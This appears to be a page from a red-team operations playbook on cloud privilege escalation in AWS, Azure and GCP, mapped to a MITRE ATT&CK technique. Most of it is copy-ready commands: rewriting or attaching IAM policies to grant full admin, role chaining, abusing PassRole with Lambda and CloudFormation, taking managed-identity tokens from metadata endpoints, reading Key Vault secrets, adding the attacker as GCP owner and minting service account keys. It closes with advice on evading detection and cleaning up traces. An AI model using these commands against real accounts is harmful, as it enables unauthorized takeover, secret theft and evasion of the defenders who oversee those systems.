# Cloud Privilege Escalation

> **MITRE ATT&CK**: Privilege Escalation > T1078.004 - Valid Accounts: Cloud Accounts
> **Platforms**: AWS, Azure, GCP
> **Required Privileges**: Authenticated cloud identity with misconfigured permissions
> **OPSEC Risk**: Medium

## Strategic Overview

Cloud privilege escalation differs fundamentally from on-premises techniques. Instead of
exploiting OS-level misconfigurations, attackers abuse IAM policy misconfigurations, role
trust relationships, and service-to-service permission chains. Cloud environments often have
overly permissive IAM policies -- especially in development accounts or organizations early
in their cloud adoption journey. A Red Team Lead must understand the IAM permission model
of each major cloud provider, the common escalation patterns, and how cloud-native logging
(CloudTrail, Azure Activity Log, GCP Audit Logs) captures these actions. Unlike on-prem
attacks, cloud API calls are almost always logged, making OPSEC a constant consideration.

## AWS IAM Privilege Escalation

### Enumeration

```bash
# Enumerate current identity and permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
aws iam list-user-policies --user-name CURRENT_USER
aws iam get-user-policy --user-name CURRENT_USER --policy-name POLICY_NAME

# Enumerate all inline and attached policies (if permitted)
aws iam list-roles
aws iam list-policies --scope Local

# Automated enumeration with enumerate-iam
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET

# Pacu - AWS exploitation framework
pacu
# Inside Pacu:
run iam__enum_permissions
run iam__privesc_scan
```

### iam:CreatePolicyVersion

Create a new version of an existing managed policy with admin permissions. The new version
becomes the default policy, granting full access.

```bash
# Create admin policy version (replaces current default)
aws iam create-policy-version \
    --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
    --set-as-default

# After escalation, verify new permissions
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --version-id v2
```

### iam:AttachUserPolicy / iam:AttachRolePolicy

Attach an existing admin policy to your user or a role you can assume.

```bash
# Attach AdministratorAccess policy to current user
aws iam attach-user-policy \
    --user-name CURRENT_USER \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Attach to a role
aws iam attach-role-policy \
    --role-name TARGET_ROLE \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### iam:PutUserPolicy / iam:PutRolePolicy

Add an inline admin policy directly to a user or role.

```bash
# Add inline admin policy to current user
aws iam put-user-policy \
    --user-name CURRENT_USER \
    --policy-name AdminAccess \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# Add inline admin policy to a role
aws iam put-role-policy \
    --role-name TARGET_ROLE \
    --policy-name AdminAccess \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### sts:AssumeRole (Role Chaining)

Assume a role with higher privileges, potentially chaining through multiple roles.

```bash
# Assume a more privileged role
aws sts assume-role \
    --role-arn arn:aws:iam::ACCOUNT_ID:role/AdminRole \
    --role-session-name escalation

# Export returned credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Cross-account role assumption
aws sts assume-role \
    --role-arn arn:aws:iam::OTHER_ACCOUNT_ID:role/CrossAccountRole \
    --role-session-name lateral
```

### Lambda + iam:PassRole

Create a Lambda function that runs with a more privileged role.

```bash
# Create Lambda function with admin role
aws lambda create-function \
    --function-name privesc \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT_ID:role/AdminRole \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://function.zip

# Lambda code (function.zip) executes with AdminRole permissions
# Example: create admin user from within Lambda
# import boto3
# iam = boto3.client('iam')
# iam.attach_user_policy(UserName='attacker', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')

# Invoke the function
aws lambda invoke --function-name privesc output.json
```

### CloudFormation + iam:PassRole

Deploy a CloudFormation stack that creates resources with elevated permissions.

```bash
# Deploy stack with admin role
aws cloudformation create-stack \
    --stack-name privesc-stack \
    --template-body file://template.yaml \
    --role-arn arn:aws:iam::ACCOUNT_ID:role/CloudFormationAdminRole \
    --capabilities CAPABILITY_NAMED_IAM

# Template can create IAM users, policies, roles with admin access
```

## Azure Privilege Escalation

### Managed Identity Abuse

```bash
# From compromised Azure VM with Managed Identity, query IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq .

# Use the token to access Azure Resource Manager
export TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

# List resources accessible with this identity
curl -s -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .

# Check role assignments for the managed identity
az role assignment list --assignee MANAGED_IDENTITY_OBJECT_ID
```

### Key Vault Access

```bash
# If managed identity has Key Vault access
# Get Key Vault token
KV_TOKEN=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)

# List secrets
curl -s -H "Authorization: Bearer $KV_TOKEN" "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.4" | jq .

# Read specific secret
curl -s -H "Authorization: Bearer $KV_TOKEN" "https://VAULT_NAME.vault.azure.net/secrets/SECRET_NAME?api-version=7.4" | jq .
```

### Azure AD Role Escalation

```powershell
# Enumerate Azure AD roles with AzureHound / ROADtools
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui

# AzureHound collection
.\azurehound.exe list -u user@domain.com -p password --tenant TENANT_ID -o azurehound.json

# Dangerous Azure AD roles
# Global Administrator - full control over Azure AD and all Azure resources
# Application Administrator - can create app registrations with admin consent
# Privileged Role Administrator - can assign Azure AD roles

# Automation Account Runbook abuse (if Contributor on Automation Account)
# Create runbook with managed identity that has higher privileges
az automation runbook create --resource-group RG --automation-account-name ACCOUNT \
    --name privesc --type PowerShell --content "Get-AzKeyVaultSecret -VaultName vault -Name secret"
az automation runbook start --resource-group RG --automation-account-name ACCOUNT --name privesc
```

## GCP Privilege Escalation

### IAM Policy Manipulation

```bash
# Check current permissions
gcloud auth list
gcloud projects get-iam-policy PROJECT_ID --format=json

# If you have setIamPolicy permission, grant yourself owner role
gcloud projects add-iam-policy-binding PROJECT_ID \
    --member="user:attacker@domain.com" \
    --role="roles/owner"

# Service account impersonation (if iam.serviceAccounts.getAccessToken)
gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com
```

### Service Account Key Creation

```bash
# Create key for high-privilege service account (requires iam.serviceAccountKeys.create)
gcloud iam service-accounts keys create key.json \
    --iam-account=admin-sa@PROJECT_ID.iam.gserviceaccount.com

# Authenticate with the key
gcloud auth activate-service-account --key-file=key.json

# Verify escalated access
gcloud projects get-iam-policy PROJECT_ID
```

### Compute Instance with Service Account

```bash
# If you can create/modify compute instances (compute.instances.create)
# Launch instance with high-privilege service account
gcloud compute instances create privesc-vm \
    --service-account=admin-sa@PROJECT_ID.iam.gserviceaccount.com \
    --scopes=cloud-platform \
    --zone=us-central1-a

# SSH into the instance and use the service account
gcloud compute ssh privesc-vm --zone=us-central1-a
# Inside the VM, the metadata server provides tokens for the attached SA
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### actAs Permission Abuse

```bash
# The iam.serviceAccounts.actAs permission allows deploying resources as a service account
# Combined with other permissions, this enables escalation paths:

# Cloud Functions + actAs: deploy function as high-priv SA
gcloud functions deploy privesc-func \
    --runtime=python39 \
    --trigger-http \
    --service-account=admin-sa@PROJECT_ID.iam.gserviceaccount.com \
    --source=./function_code/

# Cloud Run + actAs: deploy container as high-priv SA
gcloud run deploy privesc-svc \
    --image=gcr.io/PROJECT_ID/privesc \
    --service-account=admin-sa@PROJECT_ID.iam.gserviceaccount.com
```

### GCP Enumeration Tools

```bash
# Gato - GitHub Attack Toolkit for Organizations (not GCP-specific but useful)
# GCP IAM Privilege Escalation scanner
python3 gcp_iam_privesc.py --project PROJECT_ID

# ScoutSuite - multi-cloud security auditing
scout suite --provider gcp --service-account key.json

# Enumerate all service accounts and their IAM bindings
gcloud iam service-accounts list --project PROJECT_ID
gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --format="table(bindings.role, bindings.members)"
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| IAM policy modifications | CloudTrail / Azure Activity Log / GCP Audit Log | Cannot avoid logging; act during high-activity periods |
| Role assumption from unusual source | CloudTrail (AssumeRole events) | Use expected source IPs if possible |
| Service account key creation | GCP Audit Logs / AWS CloudTrail | Minimize key lifetime, delete after use |
| Managed Identity token requests | Azure diagnostic logs | Expected from VMs with managed identity |
| New Lambda/Function deployment | CloudTrail / GCP Audit Logs | Use existing functions if possible |

### Critical OPSEC Note

```
Cloud API calls are nearly always logged and often cannot be disabled.
- AWS: CloudTrail logs all IAM and STS calls (management events)
- Azure: Activity Log captures all ARM operations
- GCP: Admin Activity audit logs are always enabled and cannot be disabled

Strategies:
1. Blend with normal API call patterns (timing, source IP, user agent)
2. Minimize the number of escalation API calls
3. Clean up created resources (keys, policies, functions) after use
4. Prefer assuming existing roles over creating new permissions
5. Use temporary credentials (STS tokens) over long-lived keys
```

## Cross-References

- [Cloud Initial Access](../03-initial-access/cloud-initial-access.md) - gaining initial cloud foothold
- [Windows Local Privesc](windows-local-privesc.md) - escalation on cloud-hosted Windows instances
- [Linux Privesc](linux-privesc.md) - escalation on cloud-hosted Linux instances
- [Credential Access](../06-credential-access/README.md) - extracting cloud credentials

## References

- https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- https://github.com/RhinoSecurityLabs/pacu
- https://book.hacktricks.xyz/pentesting-cloud/aws-security
- https://book.hacktricks.xyz/pentesting-cloud/azure-security
- https://book.hacktricks.xyz/pentesting-cloud/gcp-security
- https://cloud.google.com/iam/docs/understanding-roles
- https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48
- https://github.com/dirkjanm/ROADtools
